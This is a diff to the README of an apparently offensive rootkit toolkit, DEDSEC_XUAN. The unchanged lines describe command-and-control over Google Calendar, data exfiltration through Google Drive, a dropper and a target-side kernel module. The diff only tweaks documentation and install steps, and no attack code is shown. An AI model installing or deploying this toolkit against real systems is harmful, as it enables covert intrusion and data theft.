@@ -26,7 +26,7 @@ Command-and-control runs entirely over Google's infrastructure. The rootkit uses
 ```mermaid
 flowchart TB
     Operator["🖥️  Operator"]
-    CTRL["Controller (Python)"]
+    CTRL["Controller"]
     DROP["Dropper (static ELF)"]
 
     Google["☁️  Google Infrastructure"]
@@ -1251,6 +1251,7 @@ End Date:   2026:06:16 13:57:16
 - `g++` (C++17)
 - `cmake` (3.14+)
 - `libssl-dev`, `zlib1g-dev`
+- `Python` (3.13.12) for controller
 - `upx` (optional, for dropper compression)
 - Linux kernel headers (for kernel module compilation on target)
 
@@ -1411,12 +1412,13 @@ After completing all steps, your directory should contain:
 DEDSEC_XUAN/
 ├── c2_creds.json        # Service account key for Calendar C2
 ├── data_exfil.json      # OAuth credentials for Drive exfiltration
-└── dedsec_xuan          # dedsec tool
+└── dedsec_xuan          # dedsec tool (controller)
 ```
 
 ### INSTALLATION
     git clone https://github.com/0xbitx/DEDSEC_XUAN.git
     cd DEDSEC_XUAN
+    sudo pip3 install tabulate
     chmod +x dedsec_xuan
     sudo ./dedsec_xuan
     
